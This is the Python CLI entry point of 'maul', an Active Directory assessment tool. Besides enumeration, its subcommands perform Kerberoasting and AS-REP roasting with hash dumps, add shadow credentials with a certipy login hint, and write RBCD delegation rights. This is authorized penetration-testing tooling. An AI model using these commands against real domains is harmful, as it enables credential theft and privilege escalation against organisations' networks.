"""CLI entry point for maul."""

from __future__ import annotations

import argparse
import logging
import sys

from maul import __version__


def _add_auth_args(parser: argparse.ArgumentParser, *, require_domain: bool = True) -> None:
    target = parser.add_argument_group("Target")
    target.add_argument(
        "-d",
        "--domain",
        required=require_domain,
        metavar="DOMAIN",
        help="Target domain (e.g. ellingson.com)",
    )
    target.add_argument("--dc", metavar="DC", help="Domain controller IP or hostname")
    target.add_argument("--dns", metavar="DNS", help="DNS server for resolution (default: DC)")
    target.add_argument("--ldaps", action="store_true", help="Use LDAPS (port 636)")

    auth = parser.add_argument_group("Authentication")
    auth.add_argument("-u", "--username", metavar="USER", help="Username")
    auth.add_argument("-p", "--password", metavar="PASS", help="Password")
    auth.add_argument("-H", "--hashes", metavar="LMHASH:NTHASH", dest="nthash", help="NT hash (or LMHASH:NTHASH)")
    auth.add_argument("--aes-key", metavar="KEY", help="AES-128/256 key for Kerberos")
    auth.add_argument("--pfx", metavar="PFX", help="PFX/P12 certificate file")
    auth.add_argument("--pfx-pass", metavar="PASS", help="PFX file password")
    auth.add_argument("--pass-the-cert", action="store_true", help="Use Schannel/EXTERNAL auth (LDAPS) instead of PKINIT")
    auth.add_argument("-k", "--kerberos", action="store_true", dest="use_kerberos", help="Kerberos auth via KRB5CCNAME ccache")
    auth.add_argument("--kdcHost", metavar="KDC", dest="kdchost", help="KDC hostname (if different from DC)")


def _add_output_args(parser: argparse.ArgumentParser) -> None:
    out = parser.add_argument_group("Output")
    out.add_argument("-o", "--output", metavar="FILE", help="Output file base name (produces .html, .json, .txt)")
    out.add_argument("-f", "--format", metavar="FMT", default="all",
                     choices=["all", "html", "json", "txt"],
                     help="Output format: all (default), html, json, txt")
    out.add_argument("--no-color", action="store_true", help="Disable colored output")
    out.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    out.add_argument("--debug", action="store_true", help="Debug output (very verbose)")


def _cmd_enum(args: argparse.Namespace) -> int:
    import time
    from maul.core.connection import AuthError
    from maul.core.connection import ConnectionError as MaulConnectionError
    from maul.modules import get_modules, _REGISTRY
    from maul.reporting.console import (
        console, print_banner, print_section, print_finding,
        print_findings_summary, print_findings_table,
        print_error, print_info, print_success, print_warning,
    )
    from maul.reporting.finding import Severity
    from maul.utils.constants import DOMAIN_FUNCTIONAL_LEVELS

    if args.no_color:
        import rich
        rich.reconfigure(no_color=True)

    # ── --list-modules: show available modules and exit ───────────────────────
    if getattr(args, "list_modules", False):
        # Trigger module auto-import
        _import_all_modules()
        from rich.table import Table
        t = Table(title="Available Modules", show_header=True, header_style="bold")
        t.add_column("Name",       style="cyan",  width=14)
        t.add_column("Opsec-safe", width=10)
        t.add_column("Description")
        for name, cls in sorted(_REGISTRY.items()):
            safe = "[green]yes[/]" if cls.opsec_safe else "[yellow]no[/]"
            t.add_row(name, safe, cls.description)
        console.print(t)
        return 0

    if not getattr(args, "domain", None):
        print_error("enum requires --domain unless --list-modules is used")
        return 2

    print_banner()

    # ── resolve min-severity ──────────────────────────────────────────────────
    min_sev_name = getattr(args, "min_severity", "recon").upper()
    try:
        min_sev = Severity[min_sev_name]
    except KeyError:
        min_sev = Severity.RECON

    # Default: hide RECON unless verbose
    if not getattr(args, "verbose", False) and min_sev == Severity.RECON:
        min_sev = Severity.HARDENED

    module_names: list[str] | None = None
    if args.modules:
        module_names = [m.strip() for m in args.modules.split(",")]

    conn = _make_connection(args)

    try:
        print_info(f"Connecting to {args.dc or args.domain} ...")
        conn.connect()
        print_success(f"Bound to {conn.dc}")
    except AuthError as exc:
        print_error(f"Authentication failed: {exc}")
        return 2
    except MaulConnectionError as exc:
        print_error(f"Connection failed: {exc}")
        return 3

    # ── domain info ───────────────────────────────────────────────────────────
    print_section("Domain Information")
    fl      = conn.domain_functional_level
    fl_name = DOMAIN_FUNCTIONAL_LEVELS.get(fl, f"Level {fl}")
    print_info(f"Domain         : {args.domain}")
    print_info(f"Root DN        : {conn.root_dn}")
    print_info(f"DC             : {conn.dc}")
    print_info(f"Functional lvl : {fl_name}")
    try:
        print_info(f"Domain SID     : {conn.domain_sid}")
    except Exception:
        print_info("Domain SID     : (unavailable)")

    # ── load modules ──────────────────────────────────────────────────────────
    _import_all_modules()
    try:
        module_classes = get_modules(module_names)
    except KeyError as exc:
        print_error(str(exc))
        conn.disconnect()
        return 1

    if args.opsec:
        skipped = [c.name for c in module_classes if not c.opsec_safe]
        module_classes = [c for c in module_classes if c.opsec_safe]
        if skipped:
            print_warning(f"Opsec mode: skipping {', '.join(skipped)}")

    # ── run modules with progress ─────────────────────────────────────────────
    from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

    all_findings = []
    timing: dict[str, float] = {}

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("Starting ...", total=len(module_classes))

        for mod_cls in module_classes:
            progress.update(task, description=f"[cyan]{mod_cls.name}[/]")
            mod = mod_cls(conn, options={"opsec": args.opsec})
            t0  = time.monotonic()
            try:
                findings = mod.run()
            except Exception as exc:
                print_error(f"Module {mod_cls.name} failed: {exc}")
                if getattr(args, "debug", False):
                    import traceback
                    traceback.print_exc()
                progress.advance(task)
                continue
            timing[mod_cls.name] = time.monotonic() - t0
            all_findings.extend(findings)
            progress.advance(task)

    # ── display findings ──────────────────────────────────────────────────────
    displayed = 0
    current_module = ""
    for f in sorted(all_findings, key=lambda x: (x.module, -x.severity.value)):
        if f.severity < min_sev:
            continue
        if f.module != current_module:
            print_section(f"Module: {f.module}")
            current_module = f.module
        print_finding(f)
        displayed += 1

    if displayed == 0 and all_findings:
        print_info(
            f"All {len(all_findings)} finding(s) are below the display threshold "
            f"(--min-severity {min_sev.name.lower()}). Use -v to see everything."
        )

    # ── summary ───────────────────────────────────────────────────────────────
    print_section("Summary")
    print_findings_summary(all_findings)

    if getattr(args, "verbose", False) and timing:
        print_info("Module timing:")
        for name, elapsed in sorted(timing.items(), key=lambda x: -x[1]):
            print_info(f"  {name:<14} {elapsed:.1f}s")

    if args.output:
        _write_reports(all_findings, args.output, args.format, domain=args.domain)

    conn.disconnect()

    # Exit 1 if pwned/likely findings, 0 otherwise
    has_exploitable = any(f.severity >= Severity.LIKELY for f in all_findings)
    return 1 if has_exploitable else 0


def _write_reports(findings: list, base: str, fmt: str, *, domain: str = "") -> None:
    from maul.reporting.console import print_info, print_error

    if fmt in ("all", "json"):
        try:
            from maul.reporting.json_report import write_json
            write_json(findings, f"{base}.json", domain=domain)
            print_info(f"JSON report: {base}.json")
        except Exception as exc:
            print_error(f"JSON report failed: {exc}")

    if fmt in ("all", "txt"):
        try:
            from maul.reporting.text_report import write_text
            write_text(findings, f"{base}.txt", domain=domain)
            print_info(f"Text report: {base}.txt")
        except Exception as exc:
            print_error(f"Text report failed: {exc}")

    if fmt in ("all", "html"):
        try:
            from maul.reporting.html_report import write_html
            write_html(findings, f"{base}.html", domain=domain)
            print_info(f"HTML report: {base}.html")
        except Exception as exc:
            print_error(f"HTML report failed: {exc}")


def _cmd_kerberoast(args: argparse.Namespace) -> int:
    from maul.core.connection import ADConnection, AuthError
    from maul.core.connection import ConnectionError as MaulConnectionError
    from maul.reporting.console import (
        print_banner, print_error, print_info, print_success, print_warning, console
    )
    from rich.table import Table

    print_banner()

    conn = _make_connection(args)
    try:
        print_info(f"Connecting to {args.dc or args.domain} ...")
        conn.connect()
        print_success(f"Bound to {conn.dc}")
    except (AuthError, MaulConnectionError) as exc:
        print_error(str(exc))
        return 1

    try:
        from maul.offensive.kerberoast import run, hashes_to_file
        print_info("Requesting TGS tickets for kerberoastable accounts ...")
        results = run(conn, only_rc4=getattr(args, "rc4_only", False))
    except Exception as exc:
        print_error(f"Kerberoast failed: {exc}")
        if getattr(args, "debug", False):
            import traceback; traceback.print_exc()
        conn.disconnect()
        return 1

    conn.disconnect()

    ok  = [r for r in results if r.hash_str]
    err = [r for r in results if r.error]

    if not results:
        print_info("No kerberoastable accounts found.")
        return 0

    table = Table(title=f"Kerberoastable Accounts ({len(ok)} hashes, {len(err)} errors)")
    table.add_column("Username",   style="cyan")
    table.add_column("SPN",        style="white")
    table.add_column("Etype",      style="yellow")
    table.add_column("Status",     style="green")
    for r in results:
        etype_str = {17: "AES128", 18: "AES256", 23: "RC4"}.get(r.etype, str(r.etype))
        status    = "OK" if r.hash_str else f"ERR: {r.error}"
        table.add_row(r.username, r.spn, etype_str, status)
    console.print(table)

    if args.output and ok:
        n = hashes_to_file(ok, args.output)
        print_success(f"Wrote {n} hash(es) to {args.output}")
    elif ok:
        print_info("Hashes (hashcat format):")
        for r in ok:
            console.print(r.hash_str)

    return 0


def _cmd_asreproast(args: argparse.Namespace) -> int:
    from maul.core.connection import ADConnection, AuthError
    from maul.core.connection import ConnectionError as MaulConnectionError
    from maul.reporting.console import (
        print_banner, print_error, print_info, print_success, console
    )
    from rich.table import Table

    print_banner()

    conn = _make_connection(args)
    try:
        print_info(f"Connecting to {args.dc or args.domain} ...")
        conn.connect()
        print_success(f"Bound to {conn.dc}")
    except (AuthError, MaulConnectionError) as exc:
        print_error(str(exc))
        return 1

    try:
        from maul.offensive.asreproast import run, hashes_to_file
        print_info("Sending AS-REQ without pre-auth for DONT_REQUIRE_PREAUTH accounts ...")
        results = run(conn)
    except Exception as exc:
        print_error(f"AS-REP roast failed: {exc}")
        if getattr(args, "debug", False):
            import traceback; traceback.print_exc()
        conn.disconnect()
        return 1

    conn.disconnect()

    ok  = [r for r in results if r.hash_str]
    err = [r for r in results if r.error]

    if not results:
        print_info("No AS-REP roastable accounts found.")
        return 0

    table = Table(title=f"AS-REP Roastable Accounts ({len(ok)} hashes)")
    table.add_column("Username", style="cyan")
    table.add_column("Etype",    style="yellow")
    table.add_column("Status",   style="green")
    for r in results:
        etype_str = {17: "AES128", 18: "AES256", 23: "RC4"}.get(r.etype, str(r.etype))
        status    = "OK" if r.hash_str else f"ERR: {r.error}"
        table.add_row(r.username, etype_str, status)
    console.print(table)

    if args.output and ok:
        n = hashes_to_file(ok, args.output)
        print_success(f"Wrote {n} hash(es) to {args.output}")
    elif ok:
        print_info("Hashes (hashcat format):")
        for r in ok:
            console.print(r.hash_str)

    return 0


def _cmd_shadow_creds(args: argparse.Namespace) -> int:
    from maul.core.connection import ADConnection, AuthError
    from maul.core.connection import ConnectionError as MaulConnectionError
    from maul.reporting.console import (
        print_banner, print_error, print_info, print_success, print_warning, console
    )

    print_banner()

    conn = _make_connection(args)
    try:
        print_info(f"Connecting to {args.dc or args.domain} ...")
        conn.connect()
        print_success(f"Bound to {conn.dc}")
    except (AuthError, MaulConnectionError) as exc:
        print_error(str(exc))
        return 1

    # Resolve target DN
    target_dn = _resolve_target_dn(conn, args.target)
    if not target_dn:
        print_error(f"Could not resolve account: {args.target}")
        conn.disconnect()
        return 1

    print_info(f"Target DN: {target_dn}")
    action = getattr(args, "action", "add")

    try:
        from maul.offensive import shadow_creds

        if action == "list":
            creds = shadow_creds.list_credentials(conn, target_dn)
            if not creds:
                print_info("No Shadow Credentials found on this account.")
            else:
                print_info(f"Shadow Credentials ({len(creds)}):")
                for c in creds:
                    console.print(
                        f"  Device ID : [cyan]{c.device_id}[/]\n"
                        f"  Key ID    : {c.key_id}\n"
                        f"  Created   : {c.created.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
                    )

        elif action == "remove":
            if not args.device_id:
                print_error("--device-id is required for 'remove'")
                conn.disconnect()
                return 1
            removed = shadow_creds.remove(conn, target_dn, args.device_id)
            if removed:
                print_success(f"Removed credential {args.device_id}")
            else:
                print_warning(f"Device ID {args.device_id} not found")

        else:  # add
            cred, pfx_bytes, pfx_pass = shadow_creds.add(conn, target_dn)
            pfx_path = args.output or f"{args.target.split('@')[0]}.pfx"
            with open(pfx_path, "wb") as fh:
                fh.write(pfx_bytes)
            print_success(f"Shadow credential added — Device ID: {cred.device_id}")
            print_success(f"PFX saved to: {pfx_path}")
            print_success(f"PFX password: {pfx_pass}")
            print_info(
                f"Authenticate with: certipy auth -pfx {pfx_path} -password {pfx_pass} "
                f"-username {args.target} -domain {args.domain} -dc-ip {conn.dc}"
            )

    except Exception as exc:
        print_error(f"Shadow credentials operation failed: {exc}")
        if getattr(args, "debug", False):
            import traceback; traceback.print_exc()
        conn.disconnect()
        return 1

    conn.disconnect()
    return 0


def _cmd_report(args: argparse.Namespace) -> int:
    from maul.reporting.console import print_error, print_info, print_success

    if args.report_cmd == "convert":
        try:
            from maul.reporting.json_report import load_json
            report = load_json(args.input)
            findings = report["findings"]
            domain = report.get("meta", {}).get("domain", "")
        except Exception as exc:
            print_error(f"Failed to load {args.input}: {exc}")
            return 1

        if args.format in ("html", "all"):
            try:
                from maul.reporting.html_report import write_html
                out = f"{args.output}.html"
                write_html(findings, out, domain=domain)
                print_success(f"HTML report: {out}")
            except Exception as exc:
                print_error(f"HTML conversion failed: {exc}")

        if args.format in ("txt", "all"):
            try:
                from maul.reporting.text_report import write_text
                out = f"{args.output}.txt"
                write_text(findings, out, domain=domain)
                print_success(f"Text report: {out}")
            except Exception as exc:
                print_error(f"Text conversion failed: {exc}")

        return 0

    if args.report_cmd == "diff":
        try:
            from maul.reporting.json_report import diff_reports, write_diff_json
            from maul.reporting.text_report import write_diff_text
            from maul.reporting.html_report import write_diff_html

            diff = diff_reports(args.baseline, args.current)
        except Exception as exc:
            print_error(f"Failed to compute diff: {exc}")
            return 1

        print_info(
            f"Diff: {len(diff['new'])} new, "
            f"{len(diff['resolved'])} resolved, "
            f"{len(diff['escalated'])} escalated, "
            f"{len(diff['improved'])} improved"
        )

        try:
            write_diff_json(diff, f"{args.output}.diff.json")
            print_success(f"Diff JSON: {args.output}.diff.json")
        except Exception as exc:
            print_error(f"JSON diff write failed: {exc}")

        try:
            write_diff_text(diff, f"{args.output}.diff.txt")
            print_success(f"Diff text: {args.output}.diff.txt")
        except Exception as exc:
            print_error(f"Text diff write failed: {exc}")

        try:
            write_diff_html(diff, f"{args.output}.diff.html")
            print_success(f"Diff HTML: {args.output}.diff.html")
        except Exception as exc:
            print_error(f"HTML diff write failed: {exc}")

        return 0

    from maul.reporting.console import print_error
    print_error(f"Unknown report subcommand: {args.report_cmd}")
    return 1


def _cmd_rbcd(args: argparse.Namespace) -> int:
    from maul.core.connection import AuthError
    from maul.core.connection import ConnectionError as MaulConnectionError
    from maul.reporting.console import (
        print_banner, print_error, print_info, print_success, print_warning, console
    )

    print_banner()

    conn = _make_connection(args)
    try:
        print_info(f"Connecting to {args.dc or args.domain} ...")
        conn.connect()
        print_success(f"Bound to {conn.dc}")
    except (AuthError, MaulConnectionError) as exc:
        print_error(str(exc))
        return 1

    target_dn = _resolve_target_dn(conn, args.target)
    if not target_dn:
        print_error(f"Could not resolve account: {args.target}")
        conn.disconnect()
        return 1

    print_info(f"Target DN: {target_dn}")
    action = getattr(args, "action", "read")

    try:
        from maul.offensive.rbcd import get_rbcd, set_rbcd, remove_rbcd, remove_sid_from_rbcd

        if action == "read":
            sids = get_rbcd(conn, target_dn)
            if not sids:
                print_info("No RBCD delegation entries found on this account.")
            else:
                print_info(f"Allowed principals ({len(sids)}):")
                for sid in sids:
                    console.print(f"  {sid}")

        elif action == "write":
            if not args.delegate_from:
                print_error("--delegate-from is required for 'write'")
                conn.disconnect()
                return 1
            delegate_dn = _resolve_target_dn(conn, args.delegate_from)
            if not delegate_dn:
                print_error(f"Could not resolve --delegate-from account: {args.delegate_from}")
                conn.disconnect()
                return 1
            from maul.core.ldap_client import get_attr_first
            entries = conn.ldap_search(
                "(objectClass=*)",
                attributes=["objectSid"],
                base=delegate_dn,
                scope="BASE",
            )
            if not entries:
                print_error(f"Could not retrieve SID for {args.delegate_from}")
                conn.disconnect()
                return 1
            raw_sid = get_attr_first(entries[0], "objectSid")
            if not raw_sid:
                print_error(f"No objectSid on {args.delegate_from}")
                conn.disconnect()
                return 1
            from impacket.ldap.ldaptypes import LDAP_SID
            sid_obj = LDAP_SID()
            sid_obj.fromString(raw_sid if isinstance(raw_sid, bytes) else raw_sid.encode("latin-1"))
            sid_str = sid_obj.formatCanonical()
            set_rbcd(conn, target_dn, sid_str)
            print_success(f"Granted RBCD: {args.delegate_from} ({sid_str}) → {args.target}")

        elif action == "remove":
            if args.remove_sid:
                remove_sid_from_rbcd(conn, target_dn, args.remove_sid)
                print_success(f"Removed SID {args.remove_sid} from RBCD on {args.target}")
            else:
                remove_rbcd(conn, target_dn)
                print_success(f"Cleared all RBCD delegation entries on {args.target}")

    except Exception as exc:
        print_error(f"RBCD operation failed: {exc}")
        if getattr(args, "debug", False):
            import traceback; traceback.print_exc()
        conn.disconnect()
        return 1

    conn.disconnect()
    return 0


def _import_all_modules() -> None:
    """Import all module files so their @register decorators run."""
    import importlib
    for mod_name in (
        "domain", "creds", "delegation", "accounts",
        "rights", "adcs", "gpo", "computer", "application",
    ):
        try:
            importlib.import_module(f"maul.modules.{mod_name}")
        except Exception:
            pass


def _make_connection(args: argparse.Namespace):
    from maul.core.connection import ADConnection
    return ADConnection(
        domain=args.domain,
        dc=getattr(args, "dc", None),
        username=getattr(args, "username", None),
        password=getattr(args, "password", None),
        nthash=getattr(args, "nthash", None),
        aes_key=getattr(args, "aes_key", None),
        pfx=getattr(args, "pfx", None),
        pfx_pass=getattr(args, "pfx_pass", None),
        use_kerberos=getattr(args, "use_kerberos", False),
        use_ldaps=getattr(args, "ldaps", False),
        pass_the_cert=getattr(args, "pass_the_cert", False),
        kdchost=getattr(args, "kdchost", None),
        dns_server=getattr(args, "dns", None),
        timeout=getattr(args, "timeout", 30),
    )


def _resolve_target_dn(conn, target: str) -> str | None:
    """Resolve an account name / UPN / DN to a distinguishedName."""
    from maul.core.ldap_client import get_attr_first
    if target.upper().startswith("CN=") or "DC=" in target.upper():
        return target  # already a DN
    sam = _ldap_escape(target.split("@")[0])
    upn = _ldap_escape(target)
    entries = conn.ldap_search(
        f"(|(sAMAccountName={sam})(userPrincipalName={upn}))",
        attributes=["distinguishedName"],
    )
    if entries:
        return str(get_attr_first(entries[0], "distinguishedName") or entries[0].get("dn", ""))
    return None


def _ldap_escape(value: str) -> str:
    """Escape special characters for safe LDAP filter interpolation (RFC 4515)."""
    return (
        value
        .replace("\\", "\\5c")
        .replace("*", "\\2a")
        .replace("(", "\\28")
        .replace(")", "\\29")
        .replace("\x00", "\\00")
    )


_MODULE_NAMES = frozenset({
    "domain", "creds", "rights", "delegation", "adcs",
    "accounts", "gpo", "computer", "application",
})


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="maul",
        description="Active Directory privilege escalation assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Run 'maul <command> --help' for command-specific options.",
    )
    parser.add_argument("--version", action="version", version=f"maul {__version__}")

    sub = parser.add_subparsers(dest="command", title="Commands", metavar="<command>")
    sub.required = True

    # ── enum ──────────────────────────────────────────────────────────────────
    enum_p = sub.add_parser(
        "enum",
        help="Enumerate AD misconfigurations (runs all or selected modules)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Run AD enumeration modules against a domain controller.",
        epilog="""\
Modules (use -M to select, default: all):
  domain        Domain info, trusts, password policy, LDAP/SMB signing
  creds         Kerberoastable SPNs, ASREPRoast, SYSVOL creds, gMSA, LAPS
  rights        DCSync, dangerous ACLs, WriteDACL, WriteOwner, GenericAll
  delegation    Unconstrained, constrained, RBCD
  adcs          Certificate template vulns — ESC1 through ESC16
  accounts      Privileged users, adminCount, SID history, stale accounts
  gpo           GPO write access, local group membership via GPO
  computer      LAPS coverage, outdated OS, infrastructure servers
  application   Exchange, SCCM, SCOM detection

Examples:
  maul enum -d ellingson.com -u e.belford -p 'Hack_The_Planet!' --dc 10.0.0.1
  maul enum -d ellingson.com -u e.belford -p 'Hack_The_Planet!' --dc 10.0.0.1 -M adcs,rights
  maul enum -d ellingson.com -u e.belford -p 'Hack_The_Planet!' --dc 10.0.0.1 -M domain --opsec\
  maul enum --list-modules
""",
    )
    _add_auth_args(enum_p, require_domain=False)
    _add_output_args(enum_p)
    scan = enum_p.add_argument_group("Scan")
    scan.add_argument("-M", "--modules", metavar="MODS",
                      help="Comma-separated module list (default: all)")
    scan.add_argument("--opsec", action="store_true", help="Skip active/noisy checks")
    scan.add_argument("--timeout", metavar="SEC", type=int, default=30,
                      help="LDAP/SMB connection timeout in seconds (default: 30)")
    scan.add_argument("--min-severity", metavar="LEVEL", default="recon",
                      choices=["pwned", "likely", "possible", "hardened", "recon"],
                      dest="min_severity",
                      help="Minimum severity to display (default: hardened, recon with -v)")
    scan.add_argument("-L", "--list-modules", action="store_true", dest="list_modules",
                      help="List available modules and exit")
    enum_p.set_defaults(func=_cmd_enum)

    # ── kerberoast ────────────────────────────────────────────────────────────
    krb_p = sub.add_parser("kerberoast", help="Request and dump Kerberoastable TGS hashes")
    _add_auth_args(krb_p)
    krb_p.add_argument("-o", "--output", metavar="FILE", help="Output file for hashes")
    krb_p.add_argument("--rc4-only", action="store_true", dest="rc4_only",
                       help="Request RC4-downgraded tickets (easier to crack)")
    krb_p.add_argument("--debug", action="store_true", help="Debug output")
    krb_p.set_defaults(func=_cmd_kerberoast)

    # ── asreproast ────────────────────────────────────────────────────────────
    asp_p = sub.add_parser("asreproast", help="Dump AS-REP roastable hashes")
    _add_auth_args(asp_p)
    asp_p.add_argument("-o", "--output", metavar="FILE", help="Output file for hashes")
    asp_p.add_argument("--debug", action="store_true", help="Debug output")
    asp_p.set_defaults(func=_cmd_asreproast)

    # ── shadow-creds ──────────────────────────────────────────────────────────
    sc_p = sub.add_parser("shadow-creds", help="Shadow credentials attack")
    _add_auth_args(sc_p)
    sc_p.add_argument("--target", required=True, metavar="ACCOUNT",
                      help="Target machine/user account (sAMAccountName, UPN, or DN)")
    sc_p.add_argument("--action", choices=["add", "list", "remove"], default="add",
                      help="Action to perform (default: add)")
    sc_p.add_argument("--device-id", metavar="GUID",
                      help="Device ID of credential to remove (for --action remove)")
    sc_p.add_argument("-o", "--output", metavar="PFX",
                      help="Output PFX path (default: <target>.pfx)")
    sc_p.add_argument("--debug", action="store_true", help="Debug output")
    sc_p.set_defaults(func=_cmd_shadow_creds)

    # ── rbcd ──────────────────────────────────────────────────────────────────
    rbcd_p = sub.add_parser("rbcd", help="Resource-based constrained delegation abuse")
    _add_auth_args(rbcd_p)
    rbcd_p.add_argument("--target", required=True, metavar="ACCOUNT",
                        help="Target machine account (sAMAccountName, UPN, or DN)")
    rbcd_p.add_argument("--action", choices=["read", "write", "remove"], default="read",
                        help="Action: read (default), write, or remove")
    rbcd_p.add_argument("--delegate-from", metavar="ACCOUNT", dest="delegate_from",
                        help="Account to grant delegation rights (required for write)")
    rbcd_p.add_argument("--remove-sid", metavar="SID", dest="remove_sid",
                        help="Specific SID to remove (omit to clear all, for remove)")
    rbcd_p.add_argument("--debug", action="store_true", help="Debug output")
    rbcd_p.set_defaults(func=_cmd_rbcd)

    # ── report ────────────────────────────────────────────────────────────────
    rep_p = sub.add_parser("report", help="Report utilities (convert, diff)")
    rep_sub = rep_p.add_subparsers(dest="report_cmd", metavar="SUBCMD")
    rep_sub.required = True

    conv_p = rep_sub.add_parser("convert", help="Convert a JSON report to another format")
    conv_p.add_argument("--input", required=True, metavar="JSON", help="Input JSON report")
    conv_p.add_argument("--output", required=True, metavar="FILE", help="Output base name")
    conv_p.add_argument("-f", "--format", default="html", choices=["html", "txt"])
    conv_p.set_defaults(func=_cmd_report)

    diff_p = rep_sub.add_parser("diff", help="Diff two JSON reports")
    diff_p.add_argument("--baseline", required=True, metavar="JSON", help="Baseline report")
    diff_p.add_argument("--current", required=True, metavar="JSON", help="Current report")
    diff_p.add_argument("--output", required=True, metavar="FILE", help="Output base name")
    diff_p.set_defaults(func=_cmd_report)

    return parser


def main() -> None:
    parser = build_parser()

    try:
        import argcomplete
        argcomplete.autocomplete(parser)
    except ImportError:
        pass

    if len(sys.argv) > 1 and sys.argv[1] in _MODULE_NAMES:
        print(
            f"error: '{sys.argv[1]}' is not a command. "
            f"Did you mean 'maul enum -M {sys.argv[1]}'?",
            file=sys.stderr,
        )
        sys.exit(1)

    args = parser.parse_args()

    level = logging.WARNING
    if getattr(args, "debug", False):
        level = logging.DEBUG
    elif getattr(args, "verbose", False):
        level = logging.INFO
    logging.basicConfig(level=level, format="%(name)s: %(message)s")

    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
